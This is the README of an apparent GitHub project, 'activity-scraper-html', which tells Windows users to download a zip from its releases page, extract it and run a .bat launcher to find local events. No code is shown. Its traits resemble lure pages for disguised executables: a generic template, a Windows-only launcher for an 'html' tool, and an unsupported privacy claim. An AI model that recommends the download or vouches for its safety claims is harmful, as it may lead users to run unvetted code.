# 🗺️ activity-scraper-html - Find Local Events Near You

[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge)](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases)

Activity Scraper is a simple browser-based tool that finds nearby events and local activities. It scans websites for event information and presents it in a clean, easy-to-read interface. You do not need to install any special software or write any code.

## 🚀 Getting Started

This guide walks you through downloading and running Activity Scraper on your Windows computer. The entire process takes less than five minutes.

### What You Need

- A Windows computer (Windows 7, 8, 10, or 11)
- An internet connection
- A modern web browser (Chrome, Firefox, Edge, or Brave)

## ⬇️ Download the Software

Follow these steps to download Activity Scraper:

1.  Open your web browser and visit the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases).
2.  Look for the newest version at the top of the page. It is usually marked with a "Latest" label.
3.  Find the file named `activity-scraper-windows.zip` (or a similar name with ".zip").
4.  Click the file name to start the download. The file is about 50 MB.

### 🔧 Installation

Activity Scraper does not require a traditional installation. It runs directly from a folder on your computer.

1.  Locate the downloaded `.zip` file in your "Downloads" folder.
2.  Right-click the `.zip` file and select "Extract All...".
3.  Choose a destination folder. A folder on your Desktop or in your "Documents" folder works well.
4.  Click "Extract". Windows will create a new folder with the software inside.

## ▶️ Run the Software

1.  Open the folder you just extracted.
2.  Double-click the file named `start-activity-scraper.bat`. A black command prompt window will open. This is normal.
3.  Wait for the message "Server started on http://localhost:8080" (or similar) to appear in the command prompt window.
4.  Open your web browser.
5.  Type `http://localhost:8080` into the address bar and press Enter.
6.  Activity Scraper loads in your browser. You are ready to use it.

> **Important**: Keep the command prompt window open while you use Activity Scraper. Closing it stops the software.

## 🖥️ Using Activity Scraper

The interface is designed to be straightforward.

- **Search Bar**: Type a city name, zip code, or "near me" to find events.
- **Date Range**: Choose a start and end date to filter events by time.
- **Event Cards**: Each event appears as a card. The card shows the event name, date, time, location, and a short description.
- **Links**: Click "More Info" on any event card to open the original event page in a new tab.

### Example Search

1.  Type "Chicago" in the search bar.
2.  Select "This Weekend" from the date dropdown.
3.  Click the "Search" button.
4.  Event cards appear. Browse through them.

## ⚙️ Configurable Settings

You can change how Activity Scraper works by editing a simple text file.

1.  Open the folder where you extracted Activity Scraper.
2.  Find the file named `settings.json`. Open it with Notepad.
3.  You will see text that looks like this:

```json
{
  "max_results": 20,
  "date_range_days": 7,
  "default_location": "",
  "show_remote_events": true
}
```

4.  Change the numbers or text between the quotation marks. Here is what each setting does:
    - **max_results**: The maximum number of events to show at once. Change "20" to a higher or lower number.
    - **date_range_days**: How many days into the future to search. Change "7" to "30" for a month.
    - **default_location**: A default city or zip code. Type "New York" between the quotation marks.
    - **show_remote_events**: Set to `false` to hide online-only events.
5.  Save the file (File > Save).
6.  Restart Activity Scraper by closing the command prompt window and running `start-activity-scraper.bat` again.

## ❓ Troubleshooting

**The command prompt window closes immediately.**

This usually means another program is already using port 8080. Open `settings.json` and add a line:

```json
"port": 8081
```

Save the file and run `start-activity-scraper.bat` again. Then access it at `http://localhost:8081`.

**No events appear for my search.**

- Check your internet connection.
- Make sure your search term is spelled correctly.
- Try a larger city or a broader date range.

**The page looks broken or shows an error.**

Close the command prompt window. Delete the folder you extracted. Download the `.zip` file again and repeat the extraction steps.

## 📁 File Structure

Your extracted folder contains these files:

- `start-activity-scraper.bat` - Launches the software.
- `settings.json` - Configuration file.
- `app/` - Folder with the core software files. Do not modify these.

## 🔒 Security and Privacy

Activity Scraper runs entirely on your own computer. It does not send your search data to any external server. The software only connects to public event websites to gather information. Your searches stay private.

## 🆘 Getting Help

If you encounter a problem not listed here, visit the [issues page](https://github.com/Bridgeheadcompany624/activity-scraper-html/issues) on GitHub. Describe what you were doing and what happened. Include any error messages you saw. Other users and the developer may have a solution.

You can also download older versions of the software from the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases) if a newer version causes issues.

---

**Keywords**: event scraper, local activities, HTML scraper, browser tool, Windows app, find events, community events, no installation